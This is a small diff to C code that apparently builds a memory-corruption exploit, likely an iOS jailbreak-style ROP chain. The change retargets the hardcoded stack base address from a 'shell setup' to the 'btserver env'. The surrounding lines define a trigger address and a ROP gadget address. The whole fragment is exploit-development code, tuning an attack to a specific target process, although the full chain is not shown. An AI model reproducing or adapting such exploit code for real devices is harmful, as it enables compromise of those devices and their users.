@@ -173,10 +173,10 @@ int main(int   argc,
 	fprintf(fp, "#   - with love from spv <3\n");
 	fprintf(fp, "\n");
 
-	uint32_t	stack_base					= 0x1c7738; // my shell setup
+//	uint32_t	stack_base					= 0x1c7738; // my shell setup
 //	uint32_t	stack_base					= 0x1c7c88; // my 4s shell setup
 //	uint32_t	stack_base					= 0x1c2e48; // my lldb
-//	uint32_t	stack_base					= 0x1c7d68; // btserver env
+	uint32_t	stack_base					= 0x1c7d68; // btserver env
 	uint32_t	magic_trigger_addr			= 0xb6074;
 
 	uint32_t	mov_r0_0_bx_lr				= 0x8d3e	| 1;
